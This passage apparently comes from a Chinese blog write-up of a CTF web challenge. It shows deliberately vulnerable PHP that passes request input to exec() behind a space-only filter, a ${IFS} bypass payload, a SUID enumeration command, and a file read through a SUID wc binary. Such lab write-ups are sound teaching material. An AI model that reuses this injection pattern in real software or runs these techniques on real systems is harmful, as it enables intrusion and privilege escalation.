    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function-definition function">sanitize</span><span class="token punctuation">(</span><span class="token variable">$input</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">return</span> <span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$input</span><span class="token punctuation">,</span> <span class="token constant">ENT_QUOTES</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'UTF-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function-definition function">generateRandomString</span><span class="token punctuation">(</span><span class="token variable">$length</span> <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">return</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">str_shuffle</span><span class="token punctuation">(</span><span class="token function">str_repeat</span><span class="token punctuation">(</span><span class="token variable">$x</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'</span><span class="token punctuation">,</span> <span class="token function">ceil</span><span class="token punctuation">(</span><span class="token variable">$length</span> <span class="token operator">/</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token variable">$length</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">InputValidator</span> <span class="token punctuation">{<!-- --></span>
    <span class="token keyword">private</span> <span class="token variable">$maxLength</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$maxLength</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">maxLength</span> <span class="token operator">=</span> <span class="token variable">$maxLength</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">validate</span><span class="token punctuation">(</span><span class="token variable">$input</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$input</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">maxLength</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
            <span class="token keyword">return</span> <span class="token string double-quoted-string">"Input exceeds maximum length of <span class="token interpolation"><span class="token punctuation">{<!-- --></span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">maxLength</span><span class="token punctuation">}</span></span> characters"</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">CommandExecutor</span> <span class="token punctuation">{<!-- --></span>
    <span class="token keyword">private</span> <span class="token variable">$logger</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$logger</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">logger</span> <span class="token operator">=</span> <span class="token variable">$logger</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">execute</span><span class="token punctuation">(</span><span class="token variable">$input</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$input</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">' '</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">logger</span><span class="token operator">-&gt;</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Invalid input: space detected"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'No spaces allowed'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        @<span class="token function">exec</span><span class="token punctuation">(</span><span class="token variable">$input</span><span class="token punctuation">,</span> <span class="token variable">$output</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">logger</span><span class="token operator">-&gt;</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Result: <span class="token interpolation"><span class="token variable">$input</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token function">implode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">,</span> <span class="token variable">$output</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">ActionHandler</span> <span class="token punctuation">{<!-- --></span>
    <span class="token keyword">private</span> <span class="token variable">$config</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token variable">$logger</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token variable">$executor</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$config</span><span class="token punctuation">,</span> <span class="token variable">$logger</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">config</span> <span class="token operator">=</span> <span class="token variable">$config</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">logger</span> <span class="token operator">=</span> <span class="token variable">$logger</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">executor</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CommandExecutor</span><span class="token punctuation">(</span><span class="token variable">$logger</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">handle</span><span class="token punctuation">(</span><span class="token variable">$action</span><span class="token punctuation">,</span> <span class="token variable">$input</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$action</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">config</span><span class="token operator">-&gt;</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'allowed_actions'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
            <span class="token keyword">return</span> <span class="token string double-quoted-string">"Invalid action"</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$action</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'run'</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
            <span class="token variable">$validator</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InputValidator</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">config</span><span class="token operator">-&gt;</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'max_input_length'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token variable">$validationResult</span> <span class="token operator">=</span> <span class="token variable">$validator</span><span class="token operator">-&gt;</span><span class="token function">validate</span><span class="token punctuation">(</span><span class="token variable">$input</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$validationResult</span> <span class="token operator">!==</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
                <span class="token keyword">return</span> <span class="token variable">$validationResult</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>

            <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">executor</span><span class="token operator">-&gt;</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token variable">$input</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token variable">$action</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'debug'</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
            <span class="token keyword">return</span> <span class="token string double-quoted-string">"Debug mode enabled"</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token variable">$action</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'generate'</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
            <span class="token keyword">return</span> <span class="token string double-quoted-string">"Random string: "</span> <span class="token operator">.</span> <span class="token class-name static-context">StringUtils</span><span class="token operator">::</span><span class="token function">generateRandomString</span><span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token keyword">return</span> <span class="token string double-quoted-string">"Unknown action"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'action'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
    <span class="token variable">$config</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ConfigLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$logger</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Logger</span><span class="token punctuation">(</span><span class="token variable">$config</span><span class="token operator">-&gt;</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'log_level'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token variable">$actionHandler</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ActionHandler</span><span class="token punctuation">(</span><span class="token variable">$config</span><span class="token punctuation">,</span> <span class="token variable">$logger</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$input</span> <span class="token operator">=</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'input'</span><span class="token punctuation">]</span> <span class="token operator">??</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token variable">$actionHandler</span><span class="token operator">-&gt;</span><span class="token function">handle</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'action'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$input</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
    <span class="token variable">$config</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ConfigLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$logger</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Logger</span><span class="token punctuation">(</span><span class="token variable">$config</span><span class="token operator">-&gt;</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'log_level'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$userManager</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">UserManager</span><span class="token punctuation">(</span><span class="token variable">$logger</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'register'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

        <span class="token keyword">echo</span> <span class="token variable">$userManager</span><span class="token operator">-&gt;</span><span class="token function">addUser</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'login'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

        <span class="token keyword">echo</span> <span class="token variable">$userManager</span><span class="token operator">-&gt;</span><span class="token function">authenticate</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token variable">$logger</span><span class="token operator">-&gt;</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"No action provided, running default logic"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

</code></pre>
    <p>
     代码看着很复杂, 但很多也不用去看
    </p>
    <p>
     直接构造这样的payload就可以执行命令了
     <br/>
     过滤了空格, 可以用
     <code>
      ${IFS}
     </code>
     绕过
    </p>
    <pre><code>?action=run&amp;input=ls${IFS}-l${IFS}/
</code></pre>
    <p>
     但是无法拿到flag, 看一下权限发现完全没有任何权限
     <br/>
     <img alt="在这里插入图片描述" src="https://i-blog.csdnimg.cn/direct/2ee174826c0645468821df5347185a5c.png"/>
    </p>
    <p>
     尝试suid提权
    </p>
    <pre><code>find${IFS}/${IFS}-user${IFS}root${IFS}-perm${IFS}-4000${IFS}-print

或者输出到tmp目录下去
find${IFS}/${IFS}-user${IFS}root${IFS}-perm${IFS}-4000${IFS}-print${IFS}&gt;/tmp/1.txt
</code></pre>
    <p>
     好像也没啥可以利用的, 不过看着这个
     <code>
      /var/www/html/wc
     </code>
     感觉有点奇怪, 也不知道有什么用
    </p>
    <pre><code>/var/www/html/wc
/bin/umount
/bin/mount
/bin/su
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/chsh
</code></pre>
    <p>
     尝试执行一下, 应该输出了
     <code>
      /flag
     </code>
     的
     <code>
      行数 单词数 字符数
     </code>
     , 但没法显示出flag啊 , 不知道要怎么利用
     <br/>
     <img alt="在这里插入图片描述" src="https://i-blog.csdnimg.cn/direct/5a4f871143fa4e06bc4f7940ba3cdedc.png"/>
     看了wp后发现, 这个
     <code>
      wc
     </code>
     的用法
     <br/>
     <code>
      https://gtfobins.github.io/
     </code>
     <br/>
     <img alt="在这里插入图片描述" src="https://i-blog.csdnimg.cn/direct/e157d11f309a4da58618923485951184.png"/>
     <img alt="在这里插入图片描述" src="https://i-blog.csdnimg.cn/direct/9f406329c00e4c859d8c42320273b94a.png"/>
    </p>
    <p>
     使用
     <code>
      /var/www/html/wc --files0-from "/flag"
     </code>
     即可读到flag
    </p>
   </div>
   <link href="../../assets/css/markdown_views-a5d25dd831.css" rel="stylesheet"/>
   <link href="../../assets/css/style-e504d6a974.css" rel="stylesheet"/>
  </div>
 </article>
 <p alt="68747470733a2f2f626c6f:672e6373646e2e6e65742f323330325f38303437323930392f:61727469636c652f64657461696c732f313435393635343935" class_="artid" style="display:none">
 </p>
</div>


